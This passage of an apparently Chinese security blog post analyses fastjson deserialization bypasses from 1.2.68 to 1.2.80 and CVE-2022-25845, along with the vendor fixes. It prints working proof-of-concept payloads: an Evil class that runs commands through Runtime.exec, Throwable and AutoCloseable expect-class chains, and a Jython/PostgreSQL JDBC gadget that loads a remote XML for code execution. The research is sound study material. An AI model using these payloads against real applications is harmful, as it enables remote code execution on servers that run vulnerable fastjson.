+</span></span></span></code></pre></div><p>补充，高版本才有<code>internalWhite</code>，有个白名单，属于白名单的会加载，然后后面代码会return class</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">internalWhite</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">defaultClassLoader</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h5 id="return-小结">return 小结<a hidden class="anchor" aria-hidden="true" href="#return-小结">#</a></h5>
+<p>总结下<code>无autoTypeSupport</code>可以<code>return class</code>的点</p>
+<ul>
+<li>
+<p>Mappings，deserializers</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">TypeUtils</span><span class="p">.</span><span class="na">getClassFromMapping</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">deserializers</span><span class="p">.</span><span class="na">findClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div></li>
+<li>
+<p>checkAutoType里白名单（<strong>默认为空</strong></p>
+</li>
+<li>
+<p>继承JSONType.class</p>
+</li>
+<li>
+<p>internalWhite 白名单</p>
+</li>
+</ul>
+<h5 id="怎么找">怎么找<a hidden class="anchor" aria-hidden="true" href="#怎么找">#</a></h5>
+<p>然后要找<code>JavaBeanDeserializer</code>的话，<code>deserializers</code>就可以排除了，因为他init没有put对应的<code>JavaBeanDeserializer</code>（<code>ThrowableDeserializer</code>有</p>
+<p>mappings在<code>addBaseClassMappings()</code>进行初始化，可以更直观看到哪些class可以利用</p>
+<p><img loading="lazy" src="images/image-20250528104402238.png" alt="image-20250528104402238"  />
+</p>
+<p>然后看到<code>Object.class</code>这不是随便利用？（1.2.42前面看的代码逻辑）</p>
+<p>然后看了下<code>1.2.67</code>做了一些限制，expectClass不能是下方这些类，不然<code>expectClassFlag = false;</code>-&gt;不能<strong>加载和返回class</strong>（这样处理也是为了限制利用范围，因为下方继承类很多</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="n">Serializable</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="n">Cloneable</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="n">Closeable</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="n">EventListener</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="n">Iterable</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="n">Collection</span><span class="p">.</span><span class="na">class</span><span class="w">
+</span></span></span></code></pre></div><p>然后1.2.67代码上相对于之前版本，并不会都进行<code>loadClass()</code>了，改为下方这种方式</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">autoTypeSupport</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">jsonType</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">expectClassFlag</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//jsonType 就是继承JSONType.class</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">boolean</span><span class="w"> </span><span class="n">cacheClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">autoTypeSupport</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">jsonType</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">defaultClassLoader</span><span class="p">,</span><span class="w"> </span><span class="n">cacheClass</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><blockquote>
+<p>也就是从<code>mappings</code>和<code>JSONType.class</code>以及<code>internalWhite</code> 里找 <code>expectClass</code></p>
+</blockquote>
+<p>Evil继承AutoCloseable就行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">obj</span><span class="o">=</span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;java.lang.AutoCloseable\&#34;{\&#34;@type\&#34;:\&#34;Evil\&#34;,\&#34;cmd\&#34;:\&#34;calc\&#34;}}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p><strong>jdbc gadgets</strong></p>
+<p><img loading="lazy" src="images/image-20250604150902377.png" alt="image-20250604150902377"  />
+</p>
+<h4 id="1268小结">1.2.68小结<a hidden class="anchor" aria-hidden="true" href="#1268小结">#</a></h4>
+<ul>
+<li>恶意类不在黑名单内</li>
+<li>恶意类的父类（exceptClass例如<code>AutoCloseable</code>）不在黑名单内 且 要能<code>本身能return class</code> 并能获取<code>JavaBeanDeserializer</code>or<code>ThrowableDeserializer</code>反序列化加载器</li>
+<li>恶意类不能是抽象类</li>
+<li>恶意类中的<code>getter/setter/static block/constructor</code>能触发恶意操作</li>
+</ul>
+<h4 id="修复">修复<a hidden class="anchor" aria-hidden="true" href="#修复">#</a></h4>
+<p>1.2.69新增了黑名单可以参考https://github.com/LeadroyaL/fastjson-blacklist</p>
+<p><code>AutoCloseable</code>就被添加到黑名单了，所以后续去查找Throwable期望类的利用</p>
+<h2 id="12731280">1.2.73~1.2.80<a hidden class="anchor" aria-hidden="true" href="#12731280">#</a></h2>
+<blockquote>
+<p>1.2.73的改动，允许对任意类型的<strong>field进行实例化</strong>，增加了攻击面。下面的利用即是通过这个<code>特性</code></p>
+</blockquote>
+<p>下图是1.2.67的代码，可以看到是没有<code>field进行实例化</code>，而是直接获取json反序列化的结果</p>
+<p><img loading="lazy" src="images/image-20250529171525000.png" alt="image-20250529171525000"  />
+</p>
+<h3 id="利用原理">利用原理<a hidden class="anchor" aria-hidden="true" href="#利用原理">#</a></h3>
+<p>利用思路就在下图，通过**<code>putDeserializer</code>**将这3点地方存入<code>deserializers</code>缓存中，再次<code>@type</code>调用，即可直接获得class，而不会throw了</p>
+<p><img loading="lazy" src="images/20220916150508-e5e8c85c-358d-1.png" alt="img"  />
+</p>
+<p>参照y4扩展的一个demo</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MyException</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Throwable</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">MyClass</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Evil</span><span class="w"> </span><span class="n">evil</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setClazz</span><span class="p">(</span><span class="n">MyClass</span><span class="w"> </span><span class="n">clazz</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">MyException</span><span class="p">(</span><span class="n">try1</span><span class="w"> </span><span class="n">trytry</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">trytry</span><span class="p">.</span><span class="na">tryname</span><span class="o">=</span><span class="s">&#34;trytry&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">MyException</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MyClass</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">try1</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">tryname</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Evil</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">AutoCloseable</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setCmd</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cmd</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>poc</p>
+<p>d这个地方是用于<code>构造方法的参数类型</code>获取，第一次可以去掉（因为无参和有参构造方法，默认会选择无参</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;a&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.lang.Exception&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;MyException&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;trytry&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;clazz&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;evil&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;b&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;MyClass&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;asd&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;c&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Evil&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;cmd&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;calc&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;d&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;try1&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;tryname&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;tttttry&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>流程的话，直接到Exception获得<code>ThrowableDeserializer</code>并执行<code>deserialze()</code>这里吧</p>
+<p>然后这里会去一个for循环处理json中<code>key</code>的值做对应处理，</p>
+<ul>
+<li><code>@type</code>则去加载对应类，这里就是<code>MyException</code></li>
+<li>然后是<code>String</code>进行下方判断，不是elseif中字符，则存储到<code>otherValues</code>中，（clazz，evil）</li>
+</ul>
+<p><img loading="lazy" src="images/image-20250529114100342.png" alt="image-20250529114100342"  />
+</p>
+<p>然后<code>otherValues</code>不为空，则会<code>getDeserializer()</code>获取上面的加载的class，而<code>TypeUtils.cast</code>这里就实例化filed，里面执行了<code>putDeserializer</code>（也就是利用思路的关键）</p>
+<p><img loading="lazy" src="images/image-20250529113640454.png" alt="image-20250529113640454"  />
+</p>
+<p>这里还需要关注下<code>exBeanDeser.getFieldDeserializer(key);</code>这里，MyException只有 有参自构方法时，这里只会获取<code>有参自构方法的参数类型</code>，另外<code>两种</code>则不会获取（另外两种在<code>无参自构</code>时会获取）(下图需要将MyException无参自构方法<code>注释</code></p>
+<p><img loading="lazy" src="images/image-20250529160542691.png" alt="image-20250529160542691"  />
+</p>
+<p>跟进里面最后在<code>castToJavaBean()</code>中调用<code>config.getDeserializer()</code>-&gt;putDeserializer()，返回的反序列化加载器还会调用<code>createInstance()</code>进行反序列化，触发<code>static</code>和<code>自构方法</code>code</p>
+<p><img loading="lazy" src="images/image-20250529115058068.png" alt="image-20250529115058068"  />
+</p>
+<p>putDeserializer()</p>
+<p><img loading="lazy" src="images/image-20250529111735786.png" alt="image-20250529111735786"  />
+</p>
+<blockquote>
+<p>只有 <code>有参构造方法</code>的时候，会还原储存对应方法的<code>参数类型</code></p>
+<p>无构造方法 or 存在<code>无参自构方法</code>时，会还原另外两种情况类型</p>
+</blockquote>
+<h3 id="why-public-filed">why public filed<a hidden class="anchor" aria-hidden="true" href="#why-public-filed">#</a></h3>
+<p>这里要一直追随到<code>fields</code>的初始化，这里只会获取public 添加到list中</p>
+<p><img loading="lazy" src="images/image-20250529163603648.png" alt="image-20250529163603648"  />
+</p>
+<h3 id="gadget">gadget<a hidden class="anchor" aria-hidden="true" href="#gadget">#</a></h3>
+<h4 id="jdbc">jdbc<a hidden class="anchor" aria-hidden="true" href="#jdbc">#</a></h4>
+<p>依赖</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">      <span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>1.2.80<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/dependency&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;groupId&gt;</span>org.python<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>jython<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>2.7.0<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/dependency&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;groupId&gt;</span>org.postgresql<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>postgresql<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>42.3.1<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/dependency&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>spring-context<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>5.3.28<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><p>参考的y4</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;a&#34;</span><span class="p">:{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;java.lang.Exception&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;org.python.antlr.ParseException&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;type&#34;</span><span class="p">:{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;b&#34;</span><span class="p">:{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;org.python.core.PyObject&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;com.ziclix.python.sql.PyConnection&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;connection&#34;</span><span class="p">:{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;org.postgresql.jdbc.PgConnection&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;hostSpecs&#34;</span><span class="p">:</span><span class="o">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="s">&#34;host&#34;</span><span class="p">:</span><span class="s">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="s">&#34;port&#34;</span><span class="p">:</span><span class="n">2333</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">]</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;user&#34;</span><span class="p">:</span><span class="s">&#34;user&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;database&#34;</span><span class="p">:</span><span class="s">&#34;test&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;info&#34;</span><span class="p">:{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;socketFactory&#34;</span><span class="p">:</span><span class="s">&#34;org.springframework.context.support.ClassPathXmlApplicationContext&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;socketFactoryArg&#34;</span><span class="p">:</span><span class="s">&#34;http://127.0.0.1:8090/exp.xml&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;url&#34;</span><span class="p">:</span><span class="s">&#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>这个利用很猛啊</p>
+<blockquote>
+<p>流程：</p>
+<p>put Exception</p>
+<p>加载ParseException（expectClass：Exception</p>
+<p>触发ParseException#setType &ndash;&gt; put PyObject</p>
+<p>加载PyConnection（expectClass PyObject</p>
+<p>触发PyConnection自构方法 &ndash;&gt; put Connection //这里还没到调用自构方法那不，这里要先对值进行<code>还原</code>即&quot;connection&quot;:{&hellip;}，而这里会先处理<code>connection</code>，所以加载PgConnection时，Connection 为expectClass</p>
+<p>加载PgConnection（expectClass Connection //<code>PGConnection</code>是另一个类，所以这里要利用<code>Connection</code></p>
+<p>触发PgConnection自购方法 &ndash;&gt; jdbc rce</p>
+</blockquote>
+<blockquote>
+<p>那能不能这样构造呢，这样貌似更好理解，理论上是可以的，只是connection这个参数这个值为下面这个的话，<code>PyConnection</code>自购的时候会<code>异常</code></p>
+<p>{
+&ldquo;a&rdquo;:{&hellip;
+},
+&ldquo;b&rdquo;:{&hellip;.
+&ldquo;connection&rdquo;:{}
+},
+&ldquo;c&rdquo;:{
+&ldquo;@type&rdquo;:&ldquo;java.sql.Connection&rdquo;,
+&ldquo;@type&rdquo;:&ldquo;org.postgresql.jdbc.PgConnection&rdquo;,
+&hellip;
+}
+}</p>
+</blockquote>
+<p>关于<strong>field进行实例化</strong>这个特性<code>JavaBeanDeserializer</code>同样存在，初始化完参数后<code>PgConnection</code>调用自购方法，触发jdbc</p>
+<p><img loading="lazy" src="images/image-20250529174930993.png" alt="image-20250529174930993"  />
+</p>
+<h3 id="修复-1">修复<a hidden class="anchor" aria-hidden="true" href="#修复-1">#</a></h3>
+<ol>
+<li><a href="https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d">https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d</a></li>
+<li><a href="https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15">https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15</a></li>
+</ol>
+<p>除了黑白名单的变化以外就是直接端掉<code>异常类</code>这条路。</p>
+<p><a href="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/8d892d77-74bb-0a2e-f693-9a2f5f59c158.png"><img loading="lazy" src="images/8d892d77-74bb-0a2e-f693-9a2f5f59c158.png" alt="image.png"  />
+</a></p>
+<p>并且在加类缓存时多了一次autotype判断</p>
+<p>expectClass和jsonType都需要开启</p>
+<p><img loading="lazy" src="images/image-20250529104343847.png" alt="image-20250529104343847"  />
+</p>
+<h2 id="cve-2022-25845">CVE-2022-25845<a hidden class="anchor" aria-hidden="true" href="#cve-2022-25845">#</a></h2>
+<p><a href="https://github.com/luelueking/CVE-2022-25845-In-Spring">https://github.com/luelueking/CVE-2022-25845-In-Spring</a></p>
+<p><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf</a></p>
+<p>这里用的@1ue师傅的poc，跟议会上的poc构造可能有点差异吧，不过利用点是一样的</p>
+<blockquote>
+<p>这个利用在1.2.80里我觉得是<code>实用性</code>很好的poc了，这里主要需要3个依赖吧</p>
+<ul>
+<li>commons-io //用来读写文件</li>
+<li>fastjson   //不用多说，触发利用</li>
+<li>springboot //这个其实是因为会启动时，会生成一个<code>tomcat的临时目录</code>，而<code>TomcatEmbeddedWebappClassLoader</code>加载<code>Class</code>时，会在上述目录<code>对应路径</code>下查找class文件，存在的话就会加载这个class文件触发<code>static块代码执行</code></li>
+</ul>
+<p>所以这三个依赖就造就这个amazing的利用</p>
+<ol>
+<li>put java.io.InputStream 便于后续的调用</li>
+<li>因为tomcat这个目录名，并不是固定的，而是随机的，但是在java中<code>file协议</code>可以用来<code>遍历目录</code>所以这里我可以通过<code>file:///tmp</code>找到生成<code>tomcat临时目录</code>的名字</li>
+<li>及写入构造好的class文件到tomcat临时目录下，且这个可以解决目录创建的问题</li>
+<li>通过fastjson触发class加载，触发static{}执行 //这里fastjson加载类时，会用到<code>TomcatEmbeddedWebappClassLoader</code>加载，所以能加载tomcat临时目录的class。都是环环相扣的利用，挺有意思的</li>
+</ol>
+</blockquote>
+<h3 id="step1-put-javaioinputstream">Step1: put java.io.InputStream<a hidden class="anchor" aria-hidden="true" href="#step1-put-javaioinputstream">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;a&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;{    \&#34;@type\&#34;: \&#34;java.lang.Exception\&#34;,    \&#34;@type\&#34;: \&#34;com.fasterxml.jackson.core.exc.InputCoercionException\&#34;,    \&#34;p\&#34;: {    }  }&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;b&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
